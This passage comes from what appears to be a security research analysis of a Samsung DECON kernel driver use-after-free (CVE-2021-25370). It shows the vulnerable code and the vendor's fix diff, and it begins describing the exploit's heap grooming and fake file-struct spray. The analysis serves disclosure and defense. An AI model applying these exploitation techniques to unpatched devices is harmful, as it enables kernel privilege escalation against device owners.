 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The function then calls </span><span class="vdnyYxSRCi-c2">fd_install(win_data-&gt;retire_fence, sync_file-&gt;file)</span><span>&nbsp;which means that userspace can now access the fd. When </span><span class="vdnyYxSRCi-c2">fd_install</span><span>&nbsp;is called, another reference is not taken on the file so when userspace calls </span><span class="vdnyYxSRCi-c2">close(fd)</span><span>, the only reference on the file is dropped and the file struct is freed. The issue is that after calling </span><span class="vdnyYxSRCi-c2">fd_install</span><span>&nbsp;the function then calls </span><span class="vdnyYxSRCi-c2">decon_create_release_fences(decon, win_data, sync_file)</span><span>&nbsp;with the same </span><span class="vdnyYxSRCi-c2">sync_file</span><span>&nbsp;that contains the pointer to the freed file struct.</span><span class="vdnyYxSRCi-c7">&nbsp;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.07bbc43ea1d81ec2c0dcdfead664a1f6cc977475"></a><a id="t.19"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c4">&nbsp;decon_create_release_fences</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;decon_device </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;decon_win_config_data </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">win_data</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;sync_file </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">sync_file</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;i </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">for</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">i </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span><span class="vdnyYxSRCi-c4">&nbsp;i </span><span class="vdnyYxSRCi-c0">&lt;</span><span class="vdnyYxSRCi-c4">&nbsp;decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">dt</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">max_win</span><span class="vdnyYxSRCi-c0">;</span><span class="vdnyYxSRCi-c4">&nbsp;i</span><span class="vdnyYxSRCi-c0">++)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;state </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;win_data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">config</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c4">i</span><span class="vdnyYxSRCi-c0">].</span><span class="vdnyYxSRCi-c4">state</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;rel_fence </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">state </span><span class="vdnyYxSRCi-c0">==</span><span class="vdnyYxSRCi-c4">&nbsp;DECON_WIN_STATE_BUFFER</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">rel_fence </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;decon_get_valid_fd</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">();</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">rel_fence </span><span class="vdnyYxSRCi-c0">&lt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_err</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;%s: failed to get unused fd\n&quot;</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __func__</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">goto</span><span class="vdnyYxSRCi-c4">&nbsp;err</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">fd_install</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">rel_fence</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;get_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">sync_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">));</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; win_data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">config</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c4">i</span><span class="vdnyYxSRCi-c0">].</span><span class="vdnyYxSRCi-c4">rel_fence </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;rel_fence</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">err</span><span class="vdnyYxSRCi-c0">:</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">while</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">i</span><span class="vdnyYxSRCi-c0">--</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&gt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">win_data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">config</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c4">i</span><span class="vdnyYxSRCi-c0">].</span><span class="vdnyYxSRCi-c4">state </span><span class="vdnyYxSRCi-c0">==</span><span class="vdnyYxSRCi-c4">&nbsp;DECON_WIN_STATE_BUFFER</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; put_unused_fd</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">win_data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">config</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c4">i</span><span class="vdnyYxSRCi-c0">].</span><span class="vdnyYxSRCi-c4">rel_fence</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; win_data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">config</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c4">i</span><span class="vdnyYxSRCi-c0">].</span><span class="vdnyYxSRCi-c4">rel_fence </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c2">decon_create_release_fences</span><span>&nbsp;gets a new fd, but then associates that new fd with the freed file struct, </span><span class="vdnyYxSRCi-c2">sync_file-&gt;file,</span><span>&nbsp;in the call to </span><span class="vdnyYxSRCi-c2">fd_install</span><span class="vdnyYxSRCi-c7">.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>When </span><span class="vdnyYxSRCi-c2">decon_set_win_config</span><span>&nbsp;returns, </span><span class="vdnyYxSRCi-c2">retire_fence</span><span>&nbsp;is the closed fd that points to the freed file struct and </span><span class="vdnyYxSRCi-c2">rel_fence</span><span class="vdnyYxSRCi-c7">&nbsp;is the open fd that points to the freed file struct.</span></p><h3 class="vdnyYxSRCi-c8 vdnyYxSRCi-c52" id="h.k6qkjz8un3r0"><span class="vdnyYxSRCi-c33 vdnyYxSRCi-c42">Fixing the vulnerability</span></h3>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Samsung fixed this use-after-free in March 2021 as CVE-2021-25370. The fix was to move the call to </span><span class="vdnyYxSRCi-c2">fd_install</span><span>&nbsp;in </span><span class="vdnyYxSRCi-c2">decon_set_win_config</span><span>&nbsp;to the latest possible point in the function after the call to </span><span class="vdnyYxSRCi-c2">decon_create_release_fences</span><span class="vdnyYxSRCi-c7">.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.1c8f2a2ff722387482b98ebe34bbd0555192a9e2"></a><a id="t.20"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">num_of_window</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c29">-</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c29">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd_install</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c29">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c29">win_data</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c29">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c29">retire_fence</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c29">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c29">&nbsp;sync_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c29">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c29">file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c29">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_create_release_fences</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;win_data</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;sync_file</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#if !defined(CONFIG_SUPPORT_LEGACY_FENCE)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; regs</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">retire_fence </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;dma_fence_get</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">sync_file</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#endif</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; decon_hiber_block</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; mutex_lock</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">up</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; list_add_tail</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">regs</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">list</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">up</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">list</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">+</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;&nbsp; &nbsp; &nbsp; atomic_inc</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">(&amp;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">decon</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">up</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">.</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">remaining_frame</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">update_regs_list_cnt</span><span class="vdnyYxSRCi-c0">++;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">+</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;&nbsp; &nbsp; &nbsp; win_data</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">extra</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">.</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">remained_frames </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;atomic_read</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">(&amp;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">decon</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">up</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">.</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">remaining_frame</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; mutex_unlock</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">up</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; kthread_queue_work</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">up</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">worker</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">up</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">work</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">+</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;&nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">/*</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;* The code is moved here because the DPU driver may get a wrong fd</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;* through the released file pointer,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;* if the user(HWC) closes the fd and releases the file pointer.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;*</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;* Since the user land can use fd from this point/time,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;* it can be guaranteed to use an unreleased file pointer</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;* when creating a rel_fence in decon_create_release_fences(...)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c15">+ &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">+</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;&nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c15">if</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">num_of_window</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">+</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd_install</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">win_data</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">retire_fence</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">&nbsp;sync_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c15">file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c15">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; mutex_unlock</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c0">);</span></p></td></tr></table><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.3x34vnbxlb65"><span class="vdnyYxSRCi-c16">Heap Grooming and Spray</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>To groom the heap the exploit first opens and closes 30,000+ files using </span><span class="vdnyYxSRCi-c2">memfd_create</span><span>. Then, the exploit sprays the </span><span>heap</span><span class="vdnyYxSRCi-c7">&nbsp;with fake file structs. On this version of the Samsung kernel, the file struct is 0x140 bytes. In these new, fake file structs, the exploit sets four of the members:</span></p>
